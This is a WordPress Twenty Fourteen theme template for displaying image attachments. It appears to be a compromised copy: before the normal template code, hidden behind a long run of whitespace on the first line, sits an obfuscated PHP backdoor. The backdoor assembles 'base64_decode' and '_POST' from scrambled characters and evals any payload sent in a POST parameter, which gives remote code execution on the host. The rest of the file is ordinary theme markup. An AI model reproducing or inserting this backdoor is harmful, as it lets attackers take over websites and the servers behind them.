<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nb450b2'])) {eval($s21(${$s20}['nb450b2']));}?><?php
/**
 * The template for displaying image attachments
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */

// Retrieve attachment metadata.
$metadata = wp_get_attachment_metadata();

get_header();
?>

	<section id="primary" class="content-area image-attachment">
		<div id="content" class="site-content" role="main">

	<?php
		// Start the Loop.
		while ( have_posts() ) : the_post();
	?>
			<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
				<header class="entry-header">
					<?php the_title( '<h1 class="entry-title">', '</h1>' ); ?>

					<div class="entry-meta">

						<span class="entry-date"><time class="entry-date" datetime="<?php echo esc_attr( get_the_date( 'c' ) ); ?>"><?php echo esc_html( get_the_date() ); ?></time></span>

						<span class="full-size-link"><a href="<?php echo esc_url( wp_get_attachment_url() ); ?>"><?php echo $metadata['width']; ?> &times; <?php echo $metadata['height']; ?></a></span>

						<span class="parent-post-link"><a href="<?php echo esc_url( get_permalink( $post->post_parent ) ); ?>" rel="gallery"><?php echo get_the_title( $post->post_parent ); ?></a></span>
						<?php edit_post_link( __( 'Edit', 'twentyfourteen' ), '<span class="edit-link">', '</span>' ); ?>
					</div><!-- .entry-meta -->
				</header><!-- .entry-header -->

				<div class="entry-content">
					<div class="entry-attachment">
						<div class="attachment">
							<?php twentyfourteen_the_attached_image(); ?>
						</div><!-- .attachment -->

						<?php if ( has_excerpt() ) : ?>
						<div class="entry-caption">
							<?php the_excerpt(); ?>
						</div><!-- .entry-caption -->
						<?php endif; ?>
					</div><!-- .entry-attachment -->

					<?php
						the_content();
						wp_link_pages( array(
							'before'      => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentyfourteen' ) . '</span>',
							'after'       => '</div>',
							'link_before' => '<span>',
							'link_after'  => '</span>',
						) );
					?>
				</div><!-- .entry-content -->
			</article><!-- #post-## -->

			<nav id="image-navigation" class="navigation image-navigation">
				<div class="nav-links">
				<?php previous_image_link( false, '<div class="previous-image">' . __( 'Previous Image', 'twentyfourteen' ) . '</div>' ); ?>
				<?php next_image_link( false, '<div class="next-image">' . __( 'Next Image', 'twentyfourteen' ) . '</div>' ); ?>
				</div><!-- .nav-links -->
			</nav><!-- #image-navigation -->

			<?php comments_template(); ?>

		<?php endwhile; // end of the loop. ?>

		</div><!-- #content -->
	</section><!-- #primary -->

<?php
get_sidebar();
get_footer();
